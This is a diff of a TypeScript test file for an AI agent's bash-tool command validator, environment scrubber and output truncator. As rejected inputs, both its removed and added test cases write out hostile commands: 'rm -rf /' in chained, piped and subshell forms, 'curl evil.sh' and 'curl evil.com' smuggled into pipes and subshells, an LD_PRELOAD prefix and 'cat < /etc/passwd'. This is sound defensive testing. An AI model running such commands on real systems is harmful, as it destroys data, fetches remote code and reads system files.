@@ -1,232 +1,92 @@
-import { afterAll, beforeAll, describe, expect, it } from "vitest";
-import { BashTool, validateCommand } from "../src/agents/tools/codebase/bash-tool";
-import { type ToolEnvelope, executeTool } from "./execute-tool";
-import { type TestFixture, createTestFixture } from "./setup-fixture";
-import { makeDiffsLoop } from "./test-loops";
+import { describe, expect, it } from "vitest";
+import { buildSafeEnv, truncateOutput, validateCommand } from "../src/agents/tools/codebase/bash-tool";
 
-interface BashOutput {
-    exitCode: number;
-    stdout: string;
-    stderr: string;
-}
+// These tests cover only our own code - the validator grammar, the env-scrub, and
+// the output truncation. The shell, coreutils, and git are maintained elsewhere,
+// so we deliberately never spawn a process to "check that cat reads a file".
 
 describe("validateCommand", () => {
-    it("allows a simple allowed command", () => {
-        expect(validateCommand("git status")).toBeUndefined();
+    describe("accepts", () => {
+        const accepted = [
+            ["a single allowed verb", "git status"],
+            ["a piped chain of allowed verbs", "git log --oneline | head -n 5"],
+            ["a multi-stage pipe", "cat src/math.ts | sort | wc -l"],
+            ["semicolon sequencing", "git status; ls"],
+            ["&& sequencing", "ls && cat README.md"],
+            ["|| sequencing", "rg foo || echo missing"],
+            ["a pipe character inside a quoted pattern (not an operator)", "rg 'a|b' src"],
+            ["a glob as an argument", "cat src/*.ts"],
+            ["a glob argument to a flagged option", "find . -name *.ts"],
+            ["a slice read with quoted args", "sed -n '1,5p' src/math.ts"],
+        ] as const;
+
+        for (const [label, command] of accepted) {
+            it(label, () => {
+                expect(validateCommand(command)).toBeUndefined();
+            });
+        }
     });
 
-    it("allows piped allowed commands", () => {
-        expect(validateCommand("git log --oneline | head -n 5")).toBeUndefined();
-    });
+    describe("rejects", () => {
+        const rejected = [
+            ["an empty command", "", "Empty"],
+            ["a whitespace-only command", "   ", "Empty"],
+            ["a non-allowlisted verb", "curl https://example.com", "not allowed"],
+            ["a VAR=val prefix", "LD_PRELOAD=/tmp/x cat foo", "not allowed"],
+            ["a glob as the command head", "*.ts foo", "command name"],
+            ["a $() subshell", "git log $(curl evil.sh)", "not allowed"],
+            ["a backtick subshell", "git log `curl evil.sh`", "Backticks"],
+            ["an output redirect", "git log > /tmp/evil", "redirect"],
+            ["an input redirect", "cat < /etc/passwd", "redirect"],
+            ["background execution", "git status &", "background"],
+            ["a comment token", "cat foo # sneaky", "Comments"],
+            ["a non-allowlisted verb inside a pipe", "git log | curl evil.sh", "not allowed"],
+            ["a non-allowlisted verb after a sequencing operator", "git status; curl evil.sh", "not allowed"],
+            ["a trailing pipe with no following command", "git log |", "missing a command"],
+        ] as const;
 
-    it("allows multi-pipe chains of allowed commands", () => {
-        expect(validateCommand("git log --oneline | sort | head -n 5")).toBeUndefined();
-    });
-
-    it("rejects empty command", () => {
-        expect(validateCommand("")).toBeDefined();
-        expect(validateCommand("   ")).toBeDefined();
-    });
-
-    it("rejects disallowed first command", () => {
-        expect(validateCommand("rm -rf /")).toContain("not allowed");
-    });
-
-    it("rejects semicolon chaining", () => {
-        expect(validateCommand("git status; rm -rf /")).toContain("chaining");
-    });
-
-    it("rejects && chaining", () => {
-        expect(validateCommand("git status && rm -rf /")).toContain("chaining");
-    });
-
-    it("rejects || chaining", () => {
-        expect(validateCommand("git status || rm -rf /")).toContain("chaining");
-    });
-
-    it("rejects backtick subshell", () => {
-        expect(validateCommand("git log `rm -rf /`")).toContain("chaining");
-    });
-
-    it("rejects $() subshell", () => {
-        expect(validateCommand("git log $(rm -rf /)")).toContain("chaining");
-    });
-
-    it("rejects append redirect", () => {
-        expect(validateCommand("git log >> /tmp/evil")).toContain("chaining");
-    });
-
-    it("rejects heredoc redirect", () => {
-        expect(validateCommand("cat << EOF")).toContain("chaining");
-    });
-
-    it("rejects background execution", () => {
-        expect(validateCommand("git status &")).toContain("chaining");
-    });
-
-    it("rejects disallowed command in pipe", () => {
-        const result = validateCommand("git log | rm -rf /");
-        expect(result).toContain("not allowed");
-        expect(result).toContain("rm");
-    });
-
-    it("rejects disallowed command mid-pipe", () => {
-        const result = validateCommand("git log | curl evil.com | head");
-        expect(result).toContain("not allowed");
-        expect(result).toContain("curl");
+        for (const [label, command, expectedFragment] of rejected) {
+            it(label, () => {
+                expect(validateCommand(command)).toContain(expectedFragment);
+            });
+        }
     });
 });
 
-async function runBash(loop: ReturnType<typeof makeDiffsLoop>, command: string): Promise<BashOutput> {
-    const result = await executeTool<ToolEnvelope<BashOutput>>(new BashTool(), { command }, loop);
-    if (!result.success) throw new Error(`tool failed: ${result.error}`);
-    return result.result;
-}
-
-describe("bash tool", () => {
-    let fixture: TestFixture;
-    let loop: ReturnType<typeof makeDiffsLoop>;
-
-    beforeAll(async () => {
-        fixture = await createTestFixture();
-        loop = makeDiffsLoop({ workingDirectory: fixture.workingDirectory });
+describe("buildSafeEnv", () => {
+    it("forwards only the OS passthrough vars and drops everything else", () => {
+        const env = buildSafeEnv({
+            PATH: "/usr/bin",
+            HOME: "/home/agent",
+            LANG: "en_US.UTF-8",
+            AWS_SECRET_ACCESS_KEY: "super-secret",
+            GITHUB_TOKEN: "ghp_secret",
+        });
+        expect(env).toEqual({ PATH: "/usr/bin", HOME: "/home/agent", LANG: "en_US.UTF-8" });
     });
 
-    afterAll(async () => {
-        await fixture.cleanup();
+    it("omits passthrough keys that are absent from the source", () => {
+        const env = buildSafeEnv({ PATH: "/usr/bin" });
+        expect(env).toEqual({ PATH: "/usr/bin" });
+    });
+});
+
+describe("truncateOutput", () => {
+    it("returns output that fits the budget unchanged", () => {
+        expect(truncateOutput("short output", 100, "stdout")).toBe("short output");
     });
 
-    describe("allowed commands", () => {
-        it("runs git init", async () => {
-            const result = await runBash(loop, "git init");
-            expect(result.exitCode).toBe(0);
-        });
+    it("keeps the head and tail and elides the middle with a marker when over budget", () => {
+        const text = `${"H".repeat(80)}${"M".repeat(500)}${"T".repeat(80)}`;
+        const budget = 100;
+        const out = truncateOutput(text, budget, "stdout");
 
-        it("runs git status after init", async () => {
-            const result = await runBash(loop, "git status --short");
-            expect(result.exitCode).toBe(0);
-            expect(result.stdout).toContain("src/");
-        });
-
-        it("runs git log on empty repo", async () => {
-            const result = await runBash(loop, "git log --oneline");
-            // git log on a repo with no commits exits with 128
-            expect(result.exitCode).not.toBe(0);
-        });
-
-        it("runs git diff", async () => {
-            await runBash(loop, "git add -A");
-            await runBash(loop, 'git -c user.name="test" -c user.email="test@test.com" commit -m "init"');
-            const result = await runBash(loop, "git diff HEAD");
-            expect(result.exitCode).toBe(0);
-        });
-
-        it("runs ls", async () => {
-            const result = await runBash(loop, "ls");
-            expect(result.exitCode).toBe(0);
-            expect(result.stdout).toContain("src");
-            expect(result.stdout).toContain("README.md");
-        });
-
-        it("runs wc", async () => {
-            const result = await runBash(loop, "wc -l src/math.ts");
-            expect(result.exitCode).toBe(0);
-            expect(result.stdout).toContain("src/math.ts");
-        });
-
-        it("runs head", async () => {
-            const result = await runBash(loop, "head -n 2 src/math.ts");
-            expect(result.exitCode).toBe(0);
-            expect(result.stdout).toContain("export function add");
-        });
-
-        it("runs piped commands when all commands are allowed", async () => {
-            const result = await runBash(loop, "git status --short | head -n 5");
-            expect(result.exitCode).toBe(0);
-        });
-    });
-
-    describe("blocked commands", () => {
-        it("rejects rm", async () => {
-            const result = await runBash(loop, "rm -rf /");
-            expect(result.exitCode).toBe(1);
-            expect(result.stderr).toContain("not allowed");
-        });
-
-        it("rejects curl", async () => {
-            const result = await runBash(loop, "curl https://example.com");
-            expect(result.exitCode).toBe(1);
-            expect(result.stderr).toContain("not allowed");
-        });
-
-        it("rejects node", async () => {
-            const result = await runBash(loop, 'node -e "process.exit(0)"');
-            expect(result.exitCode).toBe(1);
-            expect(result.stderr).toContain("not allowed");
-        });
-
-        it("rejects empty command", async () => {
-            const result = await runBash(loop, "");
-            expect(result.exitCode).toBe(1);
-            expect(result.stderr).toContain("not allowed");
-        });
-    });
-
-    describe("command injection prevention", () => {
-        it("rejects semicolon chaining with disallowed command", async () => {
-            const result = await runBash(loop, "git status; rm -rf /");
-            expect(result.exitCode).toBe(1);
-            expect(result.stderr).toContain("chaining");
-        });
-
-        it("rejects && chaining with disallowed command", async () => {
-            const result = await runBash(loop, "git status && rm -rf /");
-            expect(result.exitCode).toBe(1);
-            expect(result.stderr).toContain("chaining");
-        });
-
-        it("rejects || chaining with disallowed command", async () => {
-            const result = await runBash(loop, "git status || rm -rf /");
-            expect(result.exitCode).toBe(1);
-            expect(result.stderr).toContain("chaining");
-        });
-
-        it("rejects $() subshell injection", async () => {
-            const result = await runBash(loop, "git log $(rm -rf /)");
-            expect(result.exitCode).toBe(1);
-            expect(result.stderr).toContain("chaining");
-        });
-
-        it("rejects backtick subshell injection", async () => {
-            const result = await runBash(loop, "git log `rm -rf /`");
-            expect(result.exitCode).toBe(1);
-            expect(result.stderr).toContain("chaining");
-        });
-
-        it("rejects disallowed command in pipe", async () => {
-            const result = await runBash(loop, "git log | rm -rf /");
-            expect(result.exitCode).toBe(1);
-            expect(result.stderr).toContain("not allowed");
-        });
-
-        it("rejects background execution", async () => {
-            const result = await runBash(loop, "git status &");
-            expect(result.exitCode).toBe(1);
-            expect(result.stderr).toContain("chaining");
-        });
-    });
-
-    describe("error handling", () => {
-        it("returns non-zero exit code on failure", async () => {
-            const result = await runBash(loop, "git log --oneline nonexistent-ref");
-            expect(result.exitCode).not.toBe(0);
-            expect(result.stderr.length).toBeGreaterThan(0);
-        });
-
-        it("runs in the working directory", async () => {
-            const result = await runBash(loop, "find . -name 'math.ts' -type f");
-            expect(result.exitCode).toBe(0);
-            expect(result.stdout).toContain("math.ts");
-        });
+        // Head is the first 70% of the budget, tail the remaining 30%.
+        expect(out.startsWith("H".repeat(70))).toBe(true);
+        expect(out.endsWith("T".repeat(30))).toBe(true);
+        // The middle is gone, and a marker explains the cut.
+        expect(out).not.toContain("M");
+        expect(out).toContain("truncated");
+        expect(out).toContain(`${text.length} total`);
     });
 });
